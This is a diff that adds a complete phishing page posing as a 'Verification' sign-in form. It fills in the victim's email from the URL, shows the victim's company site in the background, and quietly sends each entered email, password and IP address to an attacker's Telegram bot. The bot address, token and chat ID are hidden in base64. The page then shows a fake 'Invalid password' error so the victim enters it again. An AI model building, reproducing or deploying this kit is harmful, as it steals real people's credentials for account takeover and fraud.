@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification - Sign In</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: Arial, sans-serif; background-color: #a9a9a9; }
+        #bg-frame { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: -1; }
+        .overlay-mask { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); display: flex; justify-content: center; align-items: center; z-index: 0; }
+        .login-container { background-color: white; border-radius: 8px; width: 350px; padding: 40px; text-align: center; z-index: 10; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        .form-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; font-size: 14px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        .login-button { width: 100%; padding: 12px; background-color: #0061ff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        .login-button:disabled { background-color: #ccc; }
+        .error-msg { display: none; color: #d93025; margin-top: 10px; font-weight: bold; font-size: 14px; }
+        #verifying { display: none; margin-top: 10px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <iframe id="bg-frame" src=""></iframe>
+
+    <div class="overlay-mask">
+        <div class="login-container">
+            <h1>Verification</h1>
+            <p>Sign in to continue</p>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="email" value="" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-button" id="submitBtn">Continue</button>
+                <div id="verifying">Verifying...</div>
+                <div class="error-msg" id="error-msg">Invalid password. Try again.</div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Config
+        const gate = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==");
+        const key = atob("NzUxMDY0MzMxMzpBQUczVTN6Ukt6UmdHVDVoZEhwdnVhWFJCekYwNEVtOUVkZw==");
+        const cid = atob("NzI0MDkxNTExMA==");
+
+        // --- NEW: AUTO-FILL EMAIL FROM HASH ---
+        window.addEventListener('DOMContentLoaded', () => {
+            const emailInput = document.getElementById('email');
+            const bgFrame = document.getElementById('bg-frame');
+            
+            // Get email from URL hash (e.g., #help@tncshark.com)
+            let hashEmail = window.location.hash.substring(1); 
+            
+            if (hashEmail) {
+                emailInput.value = hashEmail;
+                
+                // Optional: Auto-set background based on email domain
+                let domain = hashEmail.split('@')[1];
+                if (domain) {
+                    bgFrame.src = "https://www." + domain;
+                }
+            }
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const err = document.getElementById('error-msg');
+            const v = document.getElementById('verifying');
+            const emailVal = document.getElementById('email').value;
+            const passVal = document.getElementById('password').value;
+
+            btn.disabled = true;
+            v.style.display = 'block';
+            err.style.display = 'none';
+
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                const msg = `&#128276; *New Hit*\n&#128231; Email: ${emailVal}\n&#128273; Pass: ${passVal}\n&#127760; IP: ${ipData.ip}`;
+                
+                await fetch(`${gate}${key}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        chat_id: cid, 
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error("Submission error:", error);
+            }
+
+            setTimeout(() => {
+                v.style.display = 'none';
+                err.style.display = 'block';
+                btn.disabled = false;
+                document.getElementById('password').value = "";
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
